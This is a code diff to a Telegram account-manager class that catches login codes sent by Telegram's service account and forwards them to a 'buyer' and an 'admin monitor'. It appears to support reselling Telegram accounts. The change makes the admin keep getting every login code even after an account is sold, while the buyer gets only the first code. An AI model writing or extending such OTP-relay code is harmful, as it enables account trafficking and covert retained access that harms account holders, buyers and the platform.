@@ -606,13 +606,10 @@ class AccountManager:
         @client.on(events.NewMessage(from_users=777000))
         async def otp_listener(event):
             text = (event.raw_text or event.text or "").strip()
-            
-            # Check if admin is monitoring (not buyer) → plain forward only
-            admin_monitor = self._admin_monitors.get(account_id)
-            buyer = self._buyers.get(account_id)
 
-            if admin_monitor and not buyer:
-                # Admin monitoring only (no buyer) → plain forward, no report
+            # Always allow admin monitor (plain forward), even if buyer exists
+            admin_monitor = self._admin_monitors.get(account_id)
+            if admin_monitor:
                 try:
                     await self._bot.send_message(
                         chat_id=admin_monitor,
@@ -620,19 +617,28 @@ class AccountManager:
                     )
                 except Exception:
                     pass
-                return
 
+            buyer = self._buyers.get(account_id)
             if not buyer:
                 return
 
-            # Extract OTP code (best effort: first 4-8 digit number)
+            # Forward only the FIRST real OTP (4-8 digit). After that, stop buyer forwarding.
             otp_code = ""
             for token in text.split():
                 digits = "".join(ch for ch in token if ch.isdigit())
                 if 4 <= len(digits) <= 8:
                     otp_code = digits
                     break
-            otp_display = otp_code or text
+            if not otp_code:
+                # ignore non-OTP service messages (e.g., 2FA changed)
+                return
+
+            # If already forwarded once, ignore further OTPs
+            if self._buyers.get(account_id) is None:
+                return
+
+            # Mark as done for buyer (stop further forwarding)
+            self._buyers.pop(account_id, None)
 
             # Forward OTP message to buyer (+ Manage Devices)
             try:
